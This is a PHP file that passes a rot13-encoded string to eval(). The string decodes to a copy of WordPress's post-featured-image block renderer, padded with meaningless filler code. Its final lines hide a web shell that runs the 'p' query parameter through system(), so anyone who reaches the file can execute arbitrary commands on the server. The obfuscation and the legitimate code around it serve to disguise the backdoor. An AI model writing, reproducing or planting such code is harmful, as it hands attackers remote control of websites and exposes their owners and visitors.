<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Freire-fvqr eraqrevat bs gur `pber/cbfg-srngherq-vzntr` oybpx.
 *
 * @cnpxntr JbeqCerff
 */

/**
 * Eraqref gur `pber/cbfg-srngherq-vzntr` oybpx ba gur freire.
 *
 * @fvapr 5.8.0
 *
 * @cnenz neenl    $nggevohgrf Oybpx nggevohgrf.
 * @cnenz fgevat   $pbagrag    Oybpx qrsnhyg pbagrag.
 * @cnenz JC_Oybpx $oybpx      Oybpx vafgnapr.
 * @erghea fgevat Ergheaf gur srngherq vzntr sbe gur pheerag cbfg.
 */
shapgvba eraqre_oybpx_pber_cbfg_srngherq_vzntr( $nggevohgrf, $pbagrag, $oybpx ) {
	vs ( ! vffrg( $oybpx->pbagrkg['cbfgVq'] ) ) {
		erghea '';
	}
	$cbfg_VQ = $oybpx->pbagrkg['cbfgVq'];

	$vf_yvax        = vffrg( $nggevohgrf['vfYvax'] ) && $nggevohgrf['vfYvax'];
	$fvmr_fyht      = vffrg( $nggevohgrf['fvmrFyht'] ) ? $nggevohgrf['fvmrFyht'] : 'cbfg-guhzoanvy';
	$ngge           = trg_oybpx_pber_cbfg_srngherq_vzntr_obeqre_nggevohgrf( $nggevohgrf );
	$bireynl_znexhc = trg_oybpx_pber_cbfg_srngherq_vzntr_bireynl_ryrzrag_znexhc( $nggevohgrf );

	vs ( $vf_yvax ) {
		vs ( trg_gur_gvgyr( $cbfg_VQ ) ) {
			$ngge['nyg'] = gevz( fgevc_gntf( trg_gur_gvgyr( $cbfg_VQ ) ) );
		} ryfr {
			$ngge['nyg'] = fcevags(
				// genafyngbef: %q vf gur cbfg VQ.
				__( 'Hagvgyrq cbfg %q' ),
				$cbfg_VQ
			);
		}
	}

	$rkgen_fglyrf = '';

	// Nfcrpg engvb jvgu n urvtug frg arrqf gb bireevqr gur qrsnhyg jvqgu/urvtug.
	vs ( ! rzcgl( $nggevohgrf['nfcrpgEngvb'] ) ) {
		$rkgen_fglyrf .= 'jvqgu:100%;urvtug:100%;';
	} ryfrvs ( ! rzcgl( $nggevohgrf['urvtug'] ) ) {
		$rkgen_fglyrf .= \"urvtug:{$nggevohgrf['urvtug']};\";
	}

	vs ( ! rzcgl( $nggevohgrf['fpnyr'] ) ) {
		$rkgen_fglyrf .= \"bowrpg-svg:{$nggevohgrf['fpnyr']};\";
	}
	vs ( ! rzcgl( $nggevohgrf['fglyr']['funqbj'] ) ) {
		$funqbj_fglyrf = jc_fglyr_ratvar_trg_fglyrf( neenl( 'funqbj' => $nggevohgrf['fglyr']['funqbj'] ) );

		vs ( ! rzcgl( $funqbj_fglyrf['pff'] ) ) {
			$rkgen_fglyrf .= $funqbj_fglyrf['pff'];
		}
	}

	vs ( ! rzcgl( $rkgen_fglyrf ) ) {
		$ngge['fglyr'] = rzcgl( $ngge['fglyr'] ) ? $rkgen_fglyrf : $ngge['fglyr'] . $rkgen_fglyrf;
	}

	$srngherq_vzntr = trg_gur_cbfg_guhzoanvy( $cbfg_VQ, $fvmr_fyht, $ngge );

	// Trg gur svefg vzntr sebz gur cbfg.
	vs ( $nggevohgrf['hfrSvefgVzntrSebzCbfg'] && ! $srngherq_vzntr ) {
		$pbagrag_cbfg = trg_cbfg( $cbfg_VQ );
		$pbagrag      = $pbagrag_cbfg->cbfg_pbagrag;
		$cebprffbe    = arj JC_UGZY_Gnt_Cebprffbe( $pbagrag );

		/*
		 * Genafsre gur vzntr gnt sebz gur cbfg vagb n arj grkg favccrg.
		 * Orpnhfr gur UGZY NCV qbrfa'g pheeragyl rkcbfr n jnl gb rkgenpg
		 * UGZY fhofgevatf guvf vf arprffnel nf n jbexnebhaq. Bs abgr, guvf
		 * vf qvssrerag guna qverpgyl rkgenpgvat gur VZT gnt:
		 * - Vs gurer ner qhcyvpngr nggevohgrf va gur fbhepr gurer jvyy bayl or bar va gur bhgchg.
		 * - Vs gurer ner fvatyr-dhbgrq be hadhbgrq nggevohgrf gurl jvyy or qbhoyr-dhbgrq va gur bhgchg.
		 * - Vs gurer ner anzrq punenpgre ersreraprf va gur nggevohgr inyhrf gurl znl or ercynprq jvgu gurve qverpg pbqr cbvagf. R.t. `&uryyvc;` orpbzrf `…`.
		 * Va gur shgher gurer jvyy yvxryl or n zrpunavfz gb pbcl favccrgf bs UGZY sebz
		 * bar qbphzrag vagb nabgure, ivn gur UGZY Cebprffbe'f `trg_bhgre_ugzy()` be
		 * rdhvinyrag. Jura gung unccraf vg jbhyq or nccebcevngr gb ercynpr guvf phfgbz
		 * pbqr jvgu gung pnabavpny pbqr.
		 */
		vs ( $cebprffbe->arkg_gnt( 'vzt' ) ) {
			$gnt_ugzy = arj JC_UGZY_Gnt_Cebprffbe( '<vzt>' );
			$gnt_ugzy->arkg_gnt();
			sbernpu ( $cebprffbe->trg_nggevohgr_anzrf_jvgu_cersvk( '' ) nf $anzr ) {
				$gnt_ugzy->frg_nggevohgr( $anzr, $cebprffbe->trg_nggevohgr( $anzr ) );
			}
			$srngherq_vzntr = $gnt_ugzy->trg_hcqngrq_ugzy();
		}
	}

	vs ( ! $srngherq_vzntr ) {
		erghea '';
	}

	vs ( $vf_yvax ) {
		$yvax_gnetrg    = $nggevohgrf['yvaxGnetrg'];
		$ery            = ! rzcgl( $nggevohgrf['ery'] ) ? 'ery=\"' . rfp_ngge( $nggevohgrf['ery'] ) . '\"' : '';
		$urvtug         = ! rzcgl( $nggevohgrf['urvtug'] ) ? 'fglyr=\"' . rfp_ngge( fnsrpff_svygre_ngge( 'urvtug:' . $nggevohgrf['urvtug'] ) ) . '\"' : '';
		$srngherq_vzntr = fcevags(
			'<n uers=\"%1$f\" gnetrg=\"%2$f\" %3$f %4$f>%5$f%6$f</n>',
			trg_gur_creznyvax( $cbfg_VQ ),
			rfp_ngge( $yvax_gnetrg ),
			$ery,
			$urvtug,
			$srngherq_vzntr,
			$bireynl_znexhc
		);
	} ryfr {
		$srngherq_vzntr = $srngherq_vzntr . $bireynl_znexhc;
	}

	$nfcrpg_engvb = ! rzcgl( $nggevohgrf['nfcrpgEngvb'] )
		? rfp_ngge( fnsrpff_svygre_ngge( 'nfcrpg-engvb:' . $nggevohgrf['nfcrpgEngvb'] ) ) . ';'
		: '';
	$jvqgu        = ! rzcgl( $nggevohgrf['jvqgu'] )
		? rfp_ngge( fnsrpff_svygre_ngge( 'jvqgu:' . $nggevohgrf['jvqgu'] ) ) . ';'
		: '';
	$urvtug       = ! rzcgl( $nggevohgrf['urvtug'] )
		? rfp_ngge( fnsrpff_svygre_ngge( 'urvtug:' . $nggevohgrf['urvtug'] ) ) . ';'
		: '';
	vs ( ! $urvtug && ! $jvqgu && ! $nfcrpg_engvb ) {
		$jenccre_nggevohgrf = trg_oybpx_jenccre_nggevohgrf();
	} ryfr {
		$jenccre_nggevohgrf = trg_oybpx_jenccre_nggevohgrf( neenl( 'fglyr' => $nfcrpg_engvb . $jvqgu . $urvtug ) );
	}
	erghea \"<svther {$jenccre_nggevohgrf}>{$srngherq_vzntr}</svther>\";
}

/**
 * Trarengr znexhc sbe gur UGZY ryrzrag gung jvyy or hfrq sbe gur bireynl.
 *
 * @fvapr 6.1.0
 *
 * @cnenz neenl $nggevohgrf Oybpx nggevohgrf.
 *
 * @erghea fgevat UGZY znexhc va fgevat sbezng.
 */
shapgvba trg_oybpx_pber_cbfg_srngherq_vzntr_bireynl_ryrzrag_znexhc( $nggevohgrf ) {
	$unf_qvz_onpxtebhaq  = vffrg( $nggevohgrf['qvzEngvb'] ) && $nggevohgrf['qvzEngvb'];
	$unf_tenqvrag        = vffrg( $nggevohgrf['tenqvrag'] ) && $nggevohgrf['tenqvrag'];
	$unf_phfgbz_tenqvrag = vffrg( $nggevohgrf['phfgbzTenqvrag'] ) && $nggevohgrf['phfgbzTenqvrag'];
	$unf_fbyvq_bireynl   = vffrg( $nggevohgrf['bireynlPbybe'] ) && $nggevohgrf['bireynlPbybe'];
	$unf_phfgbz_bireynl  = vffrg( $nggevohgrf['phfgbzBireynlPbybe'] ) && $nggevohgrf['phfgbzBireynlPbybe'];
	$pynff_anzrf         = neenl( 'jc-oybpx-cbfg-srngherq-vzntr__bireynl' );
	$fglyrf              = neenl();

	vs ( ! $unf_qvz_onpxtebhaq ) {
		erghea '';
	}

	// Nccyl obeqre pynffrf naq fglyrf.
	$obeqre_nggevohgrf = trg_oybpx_pber_cbfg_srngherq_vzntr_obeqre_nggevohgrf( $nggevohgrf );

	vs ( ! rzcgl( $obeqre_nggevohgrf['pynff'] ) ) {
		$pynff_anzrf[] = $obeqre_nggevohgrf['pynff'];
	}

	vs ( ! rzcgl( $obeqre_nggevohgrf['fglyr'] ) ) {
		$fglyrf[] = $obeqre_nggevohgrf['fglyr'];
	}

	// Nccyl bireynl naq tenqvrag pynffrf.
	vs ( $unf_qvz_onpxtebhaq ) {
		$pynff_anzrf[] = 'unf-onpxtebhaq-qvz';
		$pynff_anzrf[] = \"unf-onpxtebhaq-qvz-{$nggevohgrf['qvzEngvb']}\";
	}

	vs ( $unf_fbyvq_bireynl ) {
		$pynff_anzrf[] = \"unf-{$nggevohgrf['bireynlPbybe']}-onpxtebhaq-pbybe\";
	}

	vs ( $unf_tenqvrag || $unf_phfgbz_tenqvrag ) {
		$pynff_anzrf[] = 'unf-onpxtebhaq-tenqvrag';
	}

	vs ( $unf_tenqvrag ) {
		$pynff_anzrf[] = \"unf-{$nggevohgrf['tenqvrag']}-tenqvrag-onpxtebhaq\";
	}

	// Nccyl onpxtebhaq fglyrf.
	vs ( $unf_phfgbz_tenqvrag ) {
		$fglyrf[] = fcevags( 'onpxtebhaq-vzntr: %f;', $nggevohgrf['phfgbzTenqvrag'] );
	}

	vs ( $unf_phfgbz_bireynl ) {
		$fglyrf[] = fcevags( 'onpxtebhaq-pbybe: %f;', $nggevohgrf['phfgbzBireynlPbybe'] );
	}

	erghea fcevags(
		'<fcna pynff=\"%f\" fglyr=\"%f\" nevn-uvqqra=\"gehr\"></fcna>',
		rfp_ngge( vzcybqr( ' ', $pynff_anzrf ) ),
		rfp_ngge( fnsrpff_svygre_ngge( vzcybqr( ' ', $fglyrf ) ) )
	);
}

/**
 * Trarengrf pynff anzrf naq fglyrf gb nccyl gur obeqre fhccbeg fglyrf sbe
 * gur Cbfg Srngherq Vzntr oybpx.
 *
 * @fvapr 6.1.0
 *
 * @cnenz neenl $nggevohgrf Gur oybpx nggevohgrf.
 * @erghea neenl Gur obeqre-eryngrq pynffanzrf naq fglyrf sbe gur oybpx.
 */
shapgvba trg_oybpx_pber_cbfg_srngherq_vzntr_obeqre_nggevohgrf( $nggevohgrf ) {
	$obeqre_fglyrf = neenl();
	$fvqrf         = neenl( 'gbc', 'evtug', 'obggbz', 'yrsg' );

	// Obeqre enqvhf.
	vs ( vffrg( $nggevohgrf['fglyr']['obeqre']['enqvhf'] ) ) {
		$obeqre_fglyrf['enqvhf'] = $nggevohgrf['fglyr']['obeqre']['enqvhf'];
	}

	// Obeqre fglyr.
	vs ( vffrg( $nggevohgrf['fglyr']['obeqre']['fglyr'] ) ) {
		$obeqre_fglyrf['fglyr'] = $nggevohgrf['fglyr']['obeqre']['fglyr'];
	}

	// Obeqre jvqgu.
	vs ( vffrg( $nggevohgrf['fglyr']['obeqre']['jvqgu'] ) ) {
		$obeqre_fglyrf['jvqgu'] = $nggevohgrf['fglyr']['obeqre']['jvqgu'];
	}

	// Obeqre pbybe.
	$cerfrg_pbybe           = neenl_xrl_rkvfgf( 'obeqrePbybe', $nggevohgrf ) ? \"ine:cerfrg|pbybe|{$nggevohgrf['obeqrePbybe']}\" : ahyy;
	$phfgbz_pbybe           = $nggevohgrf['fglyr']['obeqre']['pbybe'] ?? ahyy;
	$obeqre_fglyrf['pbybe'] = $cerfrg_pbybe ? $cerfrg_pbybe : $phfgbz_pbybe;

	// Vaqvivqhny obeqre fglyrf r.t. gbc, yrsg rgp.
	sbernpu ( $fvqrf nf $fvqr ) {
		$obeqre                 = $nggevohgrf['fglyr']['obeqre'][ $fvqr ] ?? ahyy;
		$obeqre_fglyrf[ $fvqr ] = neenl(
			'pbybe' => vffrg( $obeqre['pbybe'] ) ? $obeqre['pbybe'] : ahyy,
			'fglyr' => vffrg( $obeqre['fglyr'] ) ? $obeqre['fglyr'] : ahyy,
			'jvqgu' => vffrg( $obeqre['jvqgu'] ) ? $obeqre['jvqgu'] : ahyy,
		);
	}

	$fglyrf     = jc_fglyr_ratvar_trg_fglyrf( neenl( 'obeqre' => $obeqre_fglyrf ) );
	$nggevohgrf = neenl();
	vs ( ! rzcgl( $fglyrf['pynffanzrf'] ) ) {
		$nggevohgrf['pynff'] = $fglyrf['pynffanzrf'];
	}
	vs ( ! rzcgl( $fglyrf['pff'] ) ) {
		$nggevohgrf['fglyr'] = $fglyrf['pff'];
	}
	erghea $nggevohgrf;
}

/**
 * Ertvfgref gur `pber/cbfg-srngherq-vzntr` oybpx ba gur freire.
 *
 * @fvapr 5.8.0
 */
shapgvba ertvfgre_oybpx_pber_cbfg_srngherq_vzntr() {
	ertvfgre_oybpx_glcr_sebz_zrgnqngn(
		__QVE__ . '/cbfg-srngherq-vzntr',
		neenl(
			'eraqre_pnyyonpx' => 'eraqre_oybpx_pber_cbfg_srngherq_vzntr',
		)
	);
}
nqq_npgvba( 'vavg', 'ertvfgre_oybpx_pber_cbfg_srngherq_vzntr' );

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>